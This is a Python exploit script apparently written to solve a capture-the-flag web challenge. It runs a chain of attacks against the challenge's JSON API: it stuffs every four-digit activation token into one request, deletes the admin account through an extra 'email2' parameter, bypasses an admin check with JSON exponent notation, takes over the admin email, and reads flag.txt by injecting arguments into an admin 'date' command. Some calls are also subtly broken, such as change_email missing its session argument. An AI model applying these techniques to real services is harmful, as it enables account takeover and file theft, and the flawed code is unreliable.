#!/usr/bin/env python3
import requests

URL = "https://bd5cda44c5b62d458a8d65fe-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337"
JSON_API_URL = f"{URL}/json_api"
ADMIN_EMAIL = "admin@cscg.de"

def activation_token():
    alltokens = ""
    for i in range(0, 10000):
        alltokens += "{:0>4}".format(i)
    return alltokens

def check_response(res):
    if res.status_code != 200:
        print(f"Bad Response: {res}\n{res.text}")
        return False
    if res.status_code == 200 and res.json()["return"] == "Error":
        print(f"Bad Response: {res.json()}")
        return False

    return True

def create_account(s, email="creez@example.com", groupid="001", userid="0002"):
    print("Creating account (takes 20s)...")
    s = requests.Session()
    res = s.post(JSON_API_URL, json={
        "action": "create_account",
        "data": {
            "email": email,
            "password": "password",
            "groupid": "001",
            "userid": userid,
            "activation": activation_token(),
        },
    })
    assert(check_response(res))

def login(s, email):
    res = s.post(JSON_API_URL, json={
        "action": "login",
        "data": {
            "email": email,
            "password": "password",
        },
    })
    assert(check_response(res))

def delete_admin_account(s):
    email = "willbedeleted@example.com"
    create_account(s, email, "001", "9998")
    login(s, email)
    res = s.post(JSON_API_URL, json={
        "action": "delete_account",
        "data": { "email": email, "email2": ADMIN_EMAIL },
    })
    assert(check_response(res))

def change_email(s, new_email):
    res = s.post(JSON_API_URL, json={
        "action": "edit_account",
        "data": { "email": new_email },
    })
    assert(check_response(res))

def run_command(s, cmd):
    res = s.post(JSON_API_URL, json={
        "action": "admin",
        "data": { "cmd": cmd },
    })
    assert(check_response(res))
    return res

def exploit():
    s = requests.Session()

    # Remove the account to update our email to it and it doesn't exist
    delete_admin_account(s)
    print("Admin account deleted..")

    # Create account with ID that passes admin check using json exponent notation
    email = "creez@example.com"
    create_account(s, email, "222", "33e3")
    login(s, email)
    change_email(ADMIN_EMAIL)
    print("Changed email to admin email...")

    # Read flag using array format of command instead of string to bypass
    # length check
    login(s, ADMIN_EMAIL)
    res = run_command(s, ["date", "-f", "flag.txt", "--"])
    print(res.json()['message'])

exploit()
